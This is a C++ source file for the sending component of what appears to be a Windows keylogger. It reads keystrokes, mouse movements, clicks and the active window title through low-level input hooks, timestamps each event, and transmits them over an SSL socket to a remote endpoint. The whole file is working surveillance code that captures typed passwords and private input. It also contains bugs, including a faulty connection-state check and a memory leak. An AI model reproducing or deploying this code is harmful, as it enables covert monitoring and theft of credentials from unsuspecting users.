#include "Sender.h"


Sender::Sender(Client *dest)
{
	_client = dest;
}

Sender::~Sender()
{
}

void	Sender::sendKey(int code, WPARAM wParam, LPARAM lParam)
{
	if (wParam == WM_KEYDOWN) {		
		std::stringstream ss;
		KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
		DWORD wVirtKey = kbdStruct->vkCode;
		DWORD wScanCode = kbdStruct->scanCode;

		BYTE kmap[256];
		GetKeyboardState(kmap);
		
		WCHAR result;
		ToUnicode(wVirtKey, wScanCode, kmap, (LPWSTR)&result, 1, kbdStruct->flags);
		GetKeyState(0);
		
		//ss << (GetKeyState(VK_CONTROL) == 1 ? 0 : std::to_string(kbdStruct->vkCode));

		ss << "LOGKEY " << result << " " << timeUnix() << std::endl;
		this->write_to_client(ss.str());
	}
}

std::string *Sender::getActiveWindow()
{
	TCHAR wnd_title[500];
	HWND hwnd = GetForegroundWindow();
	GetWindowText(hwnd, wnd_title, sizeof(wnd_title));
	std::wstring ws(wnd_title);
	std::string* title = new std::string();
	title->append(ws.begin(), ws.end());
	return (title);
}

__int64 Sender::timeUnix() {
	const boost::posix_time::ptime time = boost::posix_time::microsec_clock::local_time();
	const boost::posix_time::ptime epoch = boost::posix_time::from_time_t(0);
	boost::posix_time::time_duration duration = time - epoch;
	return duration.total_seconds();
}

void	Sender::sendMouse(int code, WPARAM wParam, LPARAM lParam, MSLLHOOKSTRUCT* mouseStruct)
{
		std::stringstream	ss;
		KBDLLHOOKSTRUCT *info = (KBDLLHOOKSTRUCT *)lParam;
		if (wParam != 257) {
			std::string *activeNamePtr;
			activeNamePtr = getActiveWindow();
			std::cout << "LOGMOUSE" << std::endl;
			ss << "LOGMOUSE " << mouseStruct->pt.x << " " << mouseStruct->pt.y << " " << timeUnix() << std::endl;
			this->write_to_client(ss.str());
		}
}

void	Sender::sendClick(int code, WPARAM wParam, LPARAM lParam)
{
		std::stringstream	ss;
		MSLLHOOKSTRUCT* info = (MSLLHOOKSTRUCT*)lParam;
		ss << "LOGMOUSE";
		WORD highOrder = info->mouseData >> 16;

		if ((GetKeyState(VK_LBUTTON) & WM_KEYDOWN) != 0)
			ss << " LB";
		else if ((GetKeyState(VK_RBUTTON) & WM_KEYDOWN) != 0)
			ss << " RB";
		else if ((GetKeyState(VK_MBUTTON) & WM_KEYDOWN) != 0)
			ss << " MB";
		ss << " " << info->pt.x << " " << info->pt.y << " " << timeUnix() << std::endl;
		this->write_to_client(ss.str());
}

void		Sender::write_to_client(std::string msg)
{
	if (_client->getState() == (WindowsSslSocket::CONNECTED || WindowsSslSocket::AUTH)) {
		_client->getSocket()->write(msg);
	} else {
		std::cout << "client not connected, cant write" << std::endl;
	}
}